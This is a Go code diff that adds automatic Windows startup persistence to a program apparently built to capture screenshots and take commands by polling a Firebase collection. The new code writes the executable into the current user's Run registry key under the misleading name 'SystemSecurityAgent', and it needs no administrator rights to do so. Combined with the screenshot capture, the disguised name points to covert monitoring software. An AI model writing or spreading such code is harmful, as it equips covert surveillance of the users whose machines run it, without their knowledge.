@@ -19,6 +19,7 @@ import (
 	"cloud.google.com/go/firestore"
 	firebase "firebase.google.com/go/v4"
 	"github.com/kbinani/screenshot"
+	"golang.org/x/sys/windows/registry"
 	"google.golang.org/api/option"
 )
 
@@ -52,9 +53,12 @@ func main() {
 	// 3. Ensure only ONE instance runs at a time
 	preventMultipleInstances()
 
+	// 4. Automatically add to Windows Registry Startup
+	setupStartup()
+
 	ctx := context.Background()
 
-	// 4. Connect to Firebase with RETRY (for startup network delays)
+	// 5. Connect to Firebase with RETRY (for startup network delays)
 	var fsClient *firestore.Client
 	var err error
 	for i := 0; i < 10; i++ {
@@ -79,7 +83,7 @@ func main() {
 	log.Println("✅ Connected to Firebase")
 	log.Printf("👀 Watching collection '%s' every %s", collectionName, pollInterval)
 
-	// 5. Start polling loop
+	// 6. Start polling loop
 	runCycle(ctx, fsClient)
 
 	ticker := time.NewTicker(pollInterval)
@@ -88,6 +92,46 @@ func main() {
 	for {
 		<-ticker.C
 		runCycle(ctx, fsClient)
+	}
+}
+
+// setupStartup adds the executable to the Windows Registry so it runs on boot
+func setupStartup() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	// Get the exact path of the current .exe, no matter where it is located
+	exePath, err := os.Executable()
+	if err != nil {
+		log.Printf("⚠️ Failed to get exe path for startup: %v", err)
+		return
+	}
+
+	// Open the Windows Registry Run key for the current user
+	// (HKEY_CURRENT_USER does not require Administrator privileges)
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
+	if err != nil {
+		log.Printf("⚠️ Failed to open registry key: %v", err)
+		return
+	}
+	defer k.Close()
+
+	// We wrap the path in quotes to handle folders with spaces (e.g., "C:\My Tools\")
+	targetValue := `"` + exePath + `"`
+
+	// Check if it's already set so we don't write over and over
+	currentVal, _, err := k.GetStringValue("SystemSecurityAgent")
+	if err == nil && currentVal == targetValue {
+		return // Already set up correctly
+	}
+
+	// Set the registry value
+	err = k.SetStringValue("SystemSecurityAgent", targetValue)
+	if err != nil {
+		log.Printf("⚠️ Failed to set registry value: %v", err)
+	} else {
+		log.Println("✅ Successfully registered in Windows Startup")
 	}
 }
 
@@ -183,7 +227,7 @@ func setupLogging() {
 
 	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
-		// If we can't write to the exe directory, fallback to Temp folder
+		// If we can't write to the exe directory (e.g., inside Program Files), fallback to Temp
 		tempDir := os.TempDir()
 		logPath = filepath.Join(tempDir, logFileName)
 		f, err = os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
